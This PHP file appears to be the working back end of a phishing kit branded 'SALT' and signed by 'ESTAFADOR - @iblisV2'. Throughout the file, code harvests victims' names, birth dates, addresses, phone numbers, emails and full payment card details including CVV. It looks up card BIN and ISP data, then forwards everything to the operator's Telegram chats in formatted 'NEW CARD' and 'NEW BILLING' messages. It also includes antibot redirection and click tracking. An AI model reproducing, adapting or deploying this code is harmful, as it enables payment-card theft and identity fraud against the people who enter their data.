<?php

declare(strict_types=1);

function telegram_config(): ?array
{
    static $config = null;
    static $loadedMtime = 0;

    $path = telegram_config_path();
    $mtime = is_file($path) ? (int) filemtime($path) : 0;

    if ($config !== null && $mtime === $loadedMtime) {
        return $config;
    }

    if (!is_file($path)) {
        $config = null;
        $loadedMtime = 0;

        return null;
    }

    $loaded = require $path;
    if (!is_array($loaded)) {
        $config = null;
        $loadedMtime = 0;

        return null;
    }

    $config = $loaded;
    $loadedMtime = $mtime;

    return $config;
}

function telegram_config_path(): string
{
    return dirname(__DIR__, 2) . '/config/telegram.php';
}

function telegram_channel_config_key(string $channel): ?string
{
    return match ($channel) {
        'clicks' => 'chat_id_clicks',
        'billing' => 'chat_id_billing',
        'cc' => 'chat_id_cc',
        default => null,
    };
}

function telegram_write_config(array $config): bool
{
    $path = telegram_config_path();
    if (!is_writable($path)) {
        return false;
    }

    $export = var_export($config, true);
    $content = "<?php\n\ndeclare(strict_types=1);\n\nreturn {$export};\n";

    return file_put_contents($path, $content, LOCK_EX) !== false;
}

function telegram_migrate_chat_id(string $channel, int|string $newChatId): bool
{
    $key = telegram_channel_config_key($channel);
    if ($key === null) {
        return false;
    }

    $path = telegram_config_path();
    if (!is_file($path)) {
        return false;
    }

    $config = require $path;
    if (!is_array($config)) {
        return false;
    }

    $config[$key] = (string) $newChatId;

    return telegram_write_config($config);
}

function telegram_handle_chat_migration(?array $response, string $channel): bool
{
    if (!is_array($response) || empty($response['parameters']['migrate_to_chat_id'])) {
        return false;
    }

    return telegram_migrate_chat_id($channel, $response['parameters']['migrate_to_chat_id']);
}

function field_value(array $data, string $key): string
{
    $value = trim((string) ($data[$key] ?? ''));

    return $value !== '' ? $value : '—';
}

function format_title_sex(string $title): string
{
    return match (strtolower($title)) {
        'mr' => 'M.',
        'mrs', 'mme' => 'Mme',
        default => $title !== '' ? $title : '—',
    };
}

function format_card_number(string $number): string
{
    $digits = preg_replace('/\D/', '', $number);

    if ($digits === '') {
        return '—';
    }

    return trim(chunk_split($digits, 4, ' '));
}

function format_street_address(array $data): string
{
    $parts = array_filter([
        trim((string) ($data['street'] ?? '')),
        trim((string) ($data['streetNumber'] ?? '')),
    ], static fn (string $part): bool => $part !== '');

    return $parts !== [] ? implode(' ', $parts) : '—';
}

function interface_footer_date(): string
{
    $tz = new DateTimeZone('Europe/Zurich');
    $now = new DateTimeImmutable('now', $tz);

    return $now->format('Y') . '-' . $now->format('d') . '-' . $now->format('m') . ' ' . $now->format('H:i:s');
}

function detect_card_brand(string $digits): string
{
    if ($digits === '') {
        return '—';
    }

    if (str_starts_with($digits, '4')) {
        return 'Visa';
    }
    if (preg_match('/^5[1-5]/', $digits) || str_starts_with($digits, '2')) {
        return 'Mastercard';
    }
    if (preg_match('/^3[47]/', $digits)) {
        return 'American Express';
    }
    if (str_starts_with($digits, '6')) {
        return 'Discover';
    }

    return '—';
}

function lookup_card_bin(string $cardNumber): array
{
    $digits = preg_replace('/\D/', '', $cardNumber);
    $fallback = [
        'bank' => '—',
        'brand' => detect_card_brand($digits),
        'type' => '—',
        'country' => '—',
    ];

    if (strlen($digits) < 6) {
        return $fallback;
    }

    $bin = substr($digits, 0, min(8, strlen($digits)));
    $url = 'https://lookup.binlist.net/' . $bin;
    $context = stream_context_create([
        'http' => [
            'method' => 'GET',
            'header' => "Accept: application/json\r\nAccept-Version: 3\r\n",
            'timeout' => 5,
            'ignore_errors' => true,
        ],
    ]);

    $response = @file_get_contents($url, false, $context);
    if ($response === false) {
        return $fallback;
    }

    $json = json_decode($response, true);
    if (!is_array($json)) {
        return $fallback;
    }

    return [
        'bank' => trim((string) ($json['bank']['name'] ?? '')) ?: '—',
        'brand' => trim((string) ($json['scheme'] ?? '')) ?: $fallback['brand'],
        'type' => trim((string) ($json['type'] ?? '')) ?: '—',
        'country' => trim((string) ($json['country']['name'] ?? '')) ?: '—',
    ];
}

function lookup_isp(string $ip): string
{
    if ($ip === '—' || !filter_var($ip, FILTER_VALIDATE_IP)) {
        return '—';
    }

    $url = 'http://ip-api.com/json/' . rawurlencode($ip) . '?fields=status,isp';
    $context = stream_context_create([
        'http' => [
            'method' => 'GET',
            'timeout' => 5,
            'ignore_errors' => true,
        ],
    ]);

    $response = @file_get_contents($url, false, $context);
    if ($response === false) {
        return '—';
    }

    $json = json_decode($response, true);
    if (!is_array($json) || ($json['status'] ?? '') !== 'success') {
        return '—';
    }

    return trim((string) ($json['isp'] ?? '')) ?: '—';
}

function msg_val(array $data, string $key): string
{
    return trim((string) ($data[$key] ?? ''));
}

function format_nationality(string $country): string
{
    return match (strtolower($country)) {
        'ch' => 'Suisse',
        'li' => 'Liechtenstein',
        default => trim($country),
    };
}

function build_card_message(array $data, bool $partial = false): string
{
    $cardDigits = $partial ? '' : preg_replace('/\D/', '', (string) ($data['cardNumber'] ?? ''));
    $client = is_array($data['client'] ?? null) ? $data['client'] : [];

    $tz = new DateTimeZone('Europe/Zurich');
    $now = new DateTimeImmutable('now', $tz);
    $year = $now->format('Y');
    $jj = $now->format('d');
    $mm = $now->format('m');
    $time = $now->format('H:i:s');

    $card = $cardDigits;
    $bin = lookup_card_bin($cardDigits);
    $titre = format_title_sex((string) ($data['title'] ?? ''));
    if ($titre === '—') {
        $titre = '';
    }
    $banque = $bin['bank'] === '—' ? '' : $bin['bank'];
    $marque = $bin['brand'] === '—' ? '' : $bin['brand'];
    $type = $bin['type'] === '—' ? '' : $bin['type'];
    $paysBanque = $bin['country'] === '—' ? '' : $bin['country'];
    $nationalite = format_nationality((string) ($data['country'] ?? ''));
    $nom = msg_val($data, 'lastName');
    $prenom = msg_val($data, 'firstName');
    $naissance = msg_val($data, 'birthDate');
    $mail = msg_val($data, 'email');
    $numero = msg_val($data, 'phone');
    $adresse = format_street_address($data);
    if ($adresse === '—') {
        $adresse = '';
    }
    $ville = msg_val($data, 'city');
    $cp = msg_val($data, 'zip');
    $plus = msg_val($data, 'addressDetails');
    $nomTitulaire = $partial ? '' : msg_val($data, 'cardHolder');
    $carte = $partial ? '' : format_card_number($cardDigits);
    if ($carte === '—') {
        $carte = '';
    }
    $exp = $partial ? '' : msg_val($data, 'cardExpiry');
    $cvv = $partial ? '' : msg_val($data, 'cardCvv');
    $isp = lookup_isp(client_ip());
    if ($isp === '—') {
        $isp = '';
    }
    $info = trim((string) ($client['userAgent'] ?? ''));
    $appareil = trim((string) ($client['device'] ?? ''));
    $systeme = trim((string) ($client['os'] ?? ''));
    $visitorIp = telegram_ban_ip_for_notify($data);
    $banUrl = $visitorIp !== '' ? telegram_ban_ip_url($visitorIp) : '';
    $ipLine = $visitorIp !== '' ? "├ 🌍 IP : {$visitorIp}\n" : '';
    $banLine = $banUrl !== '' ? "└ 🚫 Bannir IP : {$banUrl}\n" : '';
    $deviceLine = $banLine === '' ? "└ 💻 Appareil : {$appareil} - {$systeme}\n" : "├ 💻 Appareil : {$appareil} - {$systeme}\n";

    if ($partial) {
        return <<<TXT
[💳] + 1 NEW BILLING | SALT [💳]
    ⤷ {$card}

🧐Informations Personnelles 
⤷ 🧐 Sex : {$titre}
⤷ 💁 Nationalité : {$nationalite}
⤷ 👤 Nom : {$nom}
⤷ 👤 Prénom : {$prenom}
⤷ 🎂 Naissance : {$naissance}
⤷ 📧 Email : {$mail}
⤷ 📞 Téléphone : {$numero}

📍 Adresse
⤷ 🏠 Adresse : {$adresse}
⤷ 🏙️ Ville : {$ville}
⤷ 📮 Code postal : {$cp}
⤷➕ Complément : {$plus} 

🔍 Informations Complémentaires
├ 🛰 ISP : {$isp}
{$ipLine}├ ⚙️ User Agent : {$info}
{$deviceLine}{$banLine}
━━━━━━━━━━━━━━━━━━━
📱Interface : SALT 
[{$year}-{$jj}-{$mm} {$time}]

➢ Developed By ESTAFADOR - @iblisV2 
━━━━━━━━━━━━━━━━━━━━
TXT;
    }

    return <<<TXT
[💳] + 1 NEW CARD | SALT [💳]
    ⤷ {$card}

🧐Informations Personnelles 
⤷ 🧐 Sex : {$titre}
⤷ 💁 Nationalité : {$nationalite}
⤷ 👤 Nom : {$nom}
⤷ 👤 Prénom : {$prenom}
⤷ 🎂 Naissance : {$naissance}
⤷ 📧 Email : {$mail}
⤷ 📞 Téléphone : {$numero}

📍 Adresse
⤷ 🏠 Adresse : {$adresse}
⤷ 🏙️ Ville : {$ville}
⤷ 📮 Code postal : {$cp}
⤷➕ Complément : {$plus} 

🏦 Carte De Paiement
⤷ 👤 Titulaire : {$nomTitulaire}
⤷ 💳 Numéro de carte : {$carte}
⤷ 📅 Date d'expiration : {$exp}
⤷ 🔐 Cryptogramme Visuel : {$cvv}

🏛️ Informations Bancaires
⤷ 🧠 Banque : {$banque}
⤷ ⭐️ Marque : {$marque}
⤷ 🧩 Type : {$type}
⤷ 🌍 Pays : {$paysBanque}

🔍 Informations Complémentaires
├ 🛰 ISP : {$isp}
{$ipLine}├ ⚙️ User Agent : {$info}
{$deviceLine}{$banLine}
━━━━━━━━━━━━━━━━━━━
📱Interface : SALT 
[{$year}-{$jj}-{$mm} {$time}]

➢ Developed By ESTAFADOR - @iblisV2 
━━━━━━━━━━━━━━━━━━━━
TXT;
}

function build_order_message(array $data): string
{
    return build_card_message($data);
}

function telegram_config_chat_id(array $config, string ...$keys): string
{
    foreach ($keys as $key) {
        $value = trim((string) ($config[$key] ?? ''));
        if ($value !== '') {
            return $value;
        }
    }

    return '';
}

function telegram_chat_id(array $config, string $channel): string
{
    return match ($channel) {
        'clicks' => telegram_config_chat_id($config, 'chat_id_clicks'),
        'billing' => telegram_config_chat_id($config, 'chat_id_billing'),
        'cc' => telegram_config_chat_id($config, 'chat_id_cc'),
        default => '',
    };
}

function telegram_api_request(string $method, array $params): ?array
{
    $config = telegram_config();
    if ($config === null) {
        return null;
    }

    $token = trim((string) ($config['bot_token'] ?? ''));
    if ($token === '') {
        return null;
    }

    $url = 'https://api.telegram.org/bot' . $token . '/' . $method;
    $body = json_encode($params, JSON_UNESCAPED_UNICODE);
    $context = stream_context_create([
        'http' => [
            'method' => 'POST',
            'header' => "Content-Type: application/json\r\n",
            'content' => $body,
            'timeout' => 10,
            'ignore_errors' => true,
        ],
    ]);

    $response = @file_get_contents($url, false, $context);
    if ($response === false) {
        return null;
    }

    $json = json_decode($response, true);

    return is_array($json) ? $json : null;
}

function telegram_site_base_cache_file(): string
{
    return dirname(__DIR__, 2) . '/data/panel/site-base-url.txt';
}

function telegram_read_site_base_cache(): string
{
    $file = telegram_site_base_cache_file();
    if (!is_file($file)) {
        return '';
    }

    $url = trim((string) file_get_contents($file));

    return filter_var($url, FILTER_VALIDATE_URL) ? rtrim($url, '/') : '';
}

function telegram_write_site_base_cache(string $baseUrl): void
{
    $dir = dirname(telegram_site_base_cache_file());
    if (!is_dir($dir)) {
        mkdir($dir, 0750, true);
    }

    file_put_contents(telegram_site_base_cache_file(), rtrim($baseUrl, '/') . "\n", LOCK_EX);
}

function telegram_detect_host(): string
{
    foreach (['HTTP_X_FORWARDED_HOST', 'HTTP_HOST', 'SERVER_NAME'] as $key) {
        $raw = trim((string) ($_SERVER[$key] ?? ''));
        if ($raw === '') {
            continue;
        }

        $host = trim(explode(',', $raw)[0]);
        if ($host !== '' && preg_match('/^[a-zA-Z0-9.\-:\[\]]+$/', $host)) {
            return $host;
        }
    }

    return '';
}

function telegram_detect_scheme(): string
{
    $forwarded = strtolower(trim((string) ($_SERVER['HTTP_X_FORWARDED_PROTO'] ?? '')));
    if ($forwarded === 'https') {
        return 'https';
    }

    if (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') {
        return 'https';
    }

    if ((string) ($_SERVER['SERVER_PORT'] ?? '') === '443') {
        return 'https';
    }

    $cfVisitor = (string) ($_SERVER['HTTP_CF_VISITOR'] ?? '');
    if ($cfVisitor !== '' && str_contains($cfVisitor, 'https')) {
        return 'https';
    }

    return 'http';
}

function telegram_detect_site_base_url(): string
{
    $host = telegram_detect_host();
    if ($host === '') {
        return '';
    }

    return telegram_detect_scheme() . '://' . $host;
}

function telegram_site_base_url(): string
{
    static $resolved = null;
    if ($resolved !== null) {
        return $resolved;
    }

    $cached = telegram_read_site_base_cache();
    $detected = telegram_detect_site_base_url();

    if ($detected !== '') {
        if ($cached !== $detected) {
            telegram_write_site_base_cache($detected);
        }
        $resolved = $detected;

        return $resolved;
    }

    $resolved = $cached;

    return $resolved;
}

function telegram_panel_url(): string
{
    $base = telegram_site_base_url();
    if ($base === '') {
        return '';
    }

    return $base . '/panel/index.php';
}

function telegram_webhook_url(): string
{
    $base = telegram_site_base_url();
    if ($base === '') {
        return '';
    }

    return rtrim($base, '/') . '/api/telegram-webhook.php';
}

function telegram_webhook_marker_file(): string
{
    return dirname(__DIR__, 2) . '/data/panel/webhook-registered.flag';
}

function telegram_get_webhook_info(): ?array
{
    $json = telegram_api_request('getWebhookInfo', []);

    return is_array($json) && !empty($json['ok']) && is_array($json['result'] ?? null)
        ? $json['result']
        : null;
}

function telegram_register_webhook(): bool
{
    $config = telegram_config();
    if ($config === null || empty($config['enabled'])) {
        return false;
    }

    $url = telegram_webhook_url();
    if ($url === '' || !str_starts_with($url, 'https://')) {
        return false;
    }

    $params = [
        'url' => $url,
        'allowed_updates' => ['callback_query'],
        'drop_pending_updates' => false,
    ];

    $secret = trim((string) ($config['webhook_secret'] ?? ''));
    if ($secret !== '') {
        $params['secret_token'] = $secret;
    }

    $json = telegram_api_request('setWebhook', $params);

    return is_array($json) && !empty($json['ok']);
}

function telegram_ensure_webhook(): void
{
    static $ran = false;
    if ($ran) {
        return;
    }
    $ran = true;

    $url = telegram_webhook_url();
    if ($url === '' || !str_starts_with($url, 'https://')) {
        return;
    }

    $info = telegram_get_webhook_info();
    $current = is_array($info) ? rtrim(trim((string) ($info['url'] ?? '')), '/') : '';
    if ($current === rtrim($url, '/') && is_file(telegram_webhook_marker_file())) {
        return;
    }

    if (telegram_register_webhook()) {
        $dir = dirname(telegram_webhook_marker_file());
        if (!is_dir($dir)) {
            mkdir($dir, 0750, true);
        }
        file_put_contents(telegram_webhook_marker_file(), date('c') . "\n", LOCK_EX);
    }
}

function telegram_is_allowed_callback_chat(array $config, int|string $chatId): bool
{
    $normalized = (string) $chatId;

    foreach (['clicks', 'billing', 'cc'] as $channel) {
        $configured = telegram_chat_id($config, $channel);
        if ($configured !== '' && (string) $configured === $normalized) {
            return true;
        }
    }

    return false;
}

function telegram_ban_ip_for_notify(array $data): string
{
    $stored = trim((string) ($data['visitorIp'] ?? $data['visitor_ip'] ?? ''));
    if ($stored !== '' && filter_var($stored, FILTER_VALIDATE_IP)) {
        return $stored;
    }

    $ip = client_ip();

    return $ip !== '—' ? $ip : '';
}

function telegram_ban_secret(): string
{
    $config = telegram_config();
    if ($config === null) {
        return '';
    }

    $secret = trim((string) ($config['panel_password'] ?? ''));
    if ($secret !== '') {
        return $secret;
    }

    return trim((string) ($config['webhook_secret'] ?? ''));
}

function telegram_ban_ip_token(string $ip): string
{
    if (!filter_var($ip, FILTER_VALIDATE_IP)) {
        return '';
    }

    $secret = telegram_ban_secret();
    if ($secret === '') {
        return '';
    }

    return hash_hmac('sha256', $ip, $secret);
}

function telegram_verify_ban_ip_token(string $ip, string $token): bool
{
    $expected = telegram_ban_ip_token($ip);

    return $expected !== '' && hash_equals($expected, $token);
}

function telegram_ban_ip_url(string $ip): string
{
    if (!filter_var($ip, FILTER_VALIDATE_IP)) {
        return '';
    }

    $base = telegram_site_base_url();
    $token = telegram_ban_ip_token($ip);
    if ($base === '' || $token === '') {
        return '';
    }

    return rtrim($base, '/') . '/api/ban-ip.php?ip=' . rawurlencode($ip) . '&t=' . rawurlencode($token);
}

function telegram_ban_ip_keyboard(string $ip): ?array
{
    $rows = [];

    $banUrl = telegram_ban_ip_url($ip);
    if ($banUrl !== '') {
        $rows[] = [[
            'text' => '🚫 BANNIR IP',
            'url' => $banUrl,
        ]];
    }

    $panelUrl = telegram_panel_url();
    if ($panelUrl !== '') {
        $rows[] = [[
            'text' => '🔐 Panel admin',
            'url' => $panelUrl,
        ]];
    }

    if ($rows === []) {
        return null;
    }

    return [
        'inline_keyboard' => $rows,
    ];
}

function send_telegram_message(string $text, string $channel = 'clicks', ?array $replyMarkup = null): bool
{
    $config = telegram_config();
    if ($config === null || empty($config['enabled'])) {
        return false;
    }

    $token = trim((string) ($config['bot_token'] ?? ''));
    $chatId = telegram_chat_id($config, $channel);
    if ($token === '' || $chatId === '') {
        return false;
    }

    $params = [
        'chat_id' => $chatId,
        'text' => $text,
        'disable_web_page_preview' => true,
    ];

    if ($replyMarkup !== null) {
        $params['reply_markup'] = $replyMarkup;
    }

    $json = telegram_api_request('sendMessage', $params);

    if (is_array($json) && !empty($json['ok'])) {
        return true;
    }

    if (telegram_handle_chat_migration($json, $channel)) {
        $config = telegram_config();
        if ($config === null) {
            return false;
        }

        $newChatId = telegram_chat_id($config, $channel);
        if ($newChatId === '') {
            return false;
        }

        $params['chat_id'] = $newChatId;
        $retry = telegram_api_request('sendMessage', $params);

        return is_array($retry) && !empty($retry['ok']);
    }

    return false;
}

function telegram_answer_callback(string $callbackQueryId, string $text, bool $showAlert = false): bool
{
    $json = telegram_api_request('answerCallbackQuery', [
        'callback_query_id' => $callbackQueryId,
        'text' => $text,
        'show_alert' => $showAlert,
    ]);

    return is_array($json) && !empty($json['ok']);
}

function notify_order(array $data): bool
{
    require_once __DIR__ . '/panel-stats.php';
    panel_stats_record_card($data);

    return send_telegram_message(build_order_message($data), 'cc', telegram_ban_ip_keyboard(telegram_ban_ip_for_notify($data)));
}

function notify_partial_order(array $data): bool
{
    require_once __DIR__ . '/panel-stats.php';
    panel_stats_record_billing($data);

    return send_telegram_message(build_card_message($data, true), 'billing', telegram_ban_ip_keyboard(telegram_ban_ip_for_notify($data)));
}

function client_ip(): string
{
    $keys = ['HTTP_CF_CONNECTING_IP', 'HTTP_X_REAL_IP', 'HTTP_X_FORWARDED_FOR', 'REMOTE_ADDR'];

    foreach ($keys as $key) {
        if (empty($_SERVER[$key])) {
            continue;
        }
        $value = trim(explode(',', (string) $_SERVER[$key])[0]);
        if (filter_var($value, FILTER_VALIDATE_IP)) {
            return $value;
        }
    }

    return '—';
}

function build_click_message(): string
{
    $tz = new DateTimeZone('Europe/Zurich');
    $now = new DateTimeImmutable('now', $tz);
    $datetime = $now->format('Y-m-d H:i:s');
    $interfaceDate = $now->format('Y') . '-' . $now->format('d') . '-' . $now->format('m') . ' ' . $now->format('H:i:s');

    return implode("\n", [
        '[🛜] +1 NEW CLICK - SUITE SITE [🛜]',
        '',
        '🕐 ' . $datetime,
        '',
        'ℹ️ INFORMATIONS',
        '⤷ IP : ' . client_ip(),
        '',
        '━━━━━━━━━━━━━━━━━━━',
        '📱Interface : SALT',
        '[' . $interfaceDate . ']',
        '',
        '➢ Developed By ESTAFADOR - @iblisV2',
        '━━━━━━━━━━━━━━━━━━━━',
    ]);
}

function notify_click(): bool
{
    require_once __DIR__ . '/panel-stats.php';
    panel_stats_record_click();

    return send_telegram_message(build_click_message(), 'clicks');
}

function build_antibot_redirect_message(string $reason, string $ip): string
{
    $tz = new DateTimeZone('Europe/Zurich');
    $now = new DateTimeImmutable('now', $tz);
    $datetime = $now->format('Y-m-d H:i:s');
    $interfaceDate = $now->format('Y') . '-' . $now->format('d') . '-' . $now->format('m') . ' ' . $now->format('H:i:s');

    return implode("\n", [
        '[🚫] +1 NEW CLICK — REDIRECTION ANTIBOT [🚫]',
        '',
        '🕐 ' . $datetime,
        '',
        'ℹ️ • ANTIBOT',
        '|- ✅ Visiteur redirige avec succes',
        '|- 🌍 IP : ' . $ip,
        '|- Raison : ' . $reason,
        '',
        '━━━━━━━━━━━━━━━━━━━',
        '📱Interface : SALT',
        '[' . $interfaceDate . ']',
        '',
        '➢ Developed By ESTAFADOR - @iblisV2',
        '━━━━━━━━━━━━━━━━━━━━',
    ]);
}

function notify_antibot_redirect(string $reason, string $ip): bool
{
    return send_telegram_message(build_antibot_redirect_message($reason, $ip), 'clicks');
}

function notify_site_click_once(): void
{
    if (session_status() === PHP_SESSION_NONE) {
        session_start();
    }

    if (!empty($_SESSION['salt_click_sent'])) {
        return;
    }

    if (function_exists('antibot_allow_click') && !antibot_allow_click()) {
        return;
    }

    $_SESSION['salt_click_sent'] = true;
    notify_click();
}
